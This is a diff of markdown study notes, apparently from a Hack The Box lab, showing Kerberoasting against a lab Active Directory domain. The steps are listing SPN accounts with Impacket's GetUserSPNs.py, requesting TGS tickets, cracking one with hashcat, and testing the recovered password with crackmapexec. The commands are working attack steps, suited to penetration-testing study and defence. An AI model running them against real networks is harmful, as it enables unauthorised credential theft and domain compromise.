@@ -65,56 +65,46 @@ Let's start by installing the Impacket toolkit, which we can grab from [Here](ht
 
 {% code fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ sudo python3 -m pip install .
+sudo python3 -m pip install .
 ```
 {% endcode %}
 
 <mark style="color:orange;">**Listing GetUserSPNs.py Help Options**</mark>
 
 ```shell-session
-mrroboteLiot@htb[/htb]$ GetUserSPNs.py -h
+GetUserSPNs.py -h
 
 ```
-
-From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.
 
 <mark style="color:orange;">**Listing SPN Accounts with GetUserSPNs.py**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
 ```
 {% endcode %}
-
-We can now pull all TGS tickets for offline processing using the `-request` flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.
 
 <mark style="color:orange;">**Requesting all TGS Tickets**</mark>
 
 {% code fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
 ```
 {% endcode %}
-
-We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the `sqldev` account.
 
 <mark style="color:orange;">**Requesting a Single TGS ticket**</mark>
 
 {% code fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
 ```
 {% endcode %}
-
-With this ticket in hand, we could attempt to crack the user's password offline using Hashcat. If we are successful, we may end up with Domain Admin rights.
-
-To facilitate offline cracking, it is always good to use the `-outputfile` flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.
 
 <mark style="color:orange;">**Saving the TGS Ticket to an Output File**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
 ```
 {% endcode %}
 
@@ -123,7 +113,7 @@ Here we've written the TGS ticket for the `sqldev` user to a file named `sqldev_
 <mark style="color:orange;">**Cracking the Ticket Offline with Hashcat**</mark>
 
 ```shell-session
-mrroboteLiot@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
 ```
 
 We've successfully cracked the user's password as `database!`.&#x20;
@@ -132,7 +122,7 @@ We've successfully cracked the user's password as `database!`.&#x20;
 
 {% code fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
 ```
 {% endcode %}
 
